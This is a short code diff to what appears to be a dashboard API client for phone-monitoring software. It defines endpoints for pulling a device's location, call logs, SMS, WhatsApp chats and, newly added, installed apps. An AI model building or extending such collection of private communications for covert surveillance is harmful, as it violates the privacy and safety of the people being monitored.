@@ -10,12 +10,13 @@ http.interceptors.request.use(cfg => {
 })
 
 // Types
-export interface Device       { id: number; name: string; deviceToken: string; registeredAt: string }
+export interface Device       { id: number; name: string; deviceToken: string; registeredAt: string; lastActivityAt?: number }
 export interface LocationDto  { latitude: number; longitude: number; accuracy: number; timestamp: number }
 export interface CallLogDto   { number: string; name: string; type: number; date: number; duration: number }
 export interface SmsDto       { address: string; body: string; date: number; type: number }
 export interface WhatsAppDto      { appPackage: string; appName: string; appIcon?: string; sender: string; message: string; timestamp: number }
 export interface WhatsAppChatDto  { chat: string; sender: string; message: string; timestamp: number }
+export interface InstalledAppDto  { packageName: string; appName: string; version: string; installedAt: number; lastSeenAt: number; iconBase64?: string }
 
 // Auth
 export const login    = (email: string, password: string) =>
@@ -46,3 +47,6 @@ export const getWhatsApp  = (deviceId: number) =>
 
 export const getWhatsAppChats = (deviceId: number) =>
   http.get<WhatsAppChatDto[]>(`/dashboard/devices/${deviceId}/whatsapp/chats`)
+
+export const getInstalledApps = (deviceId: number) =>
+  http.get<InstalledAppDto[]>(`/dashboard/devices/${deviceId}/apps`)
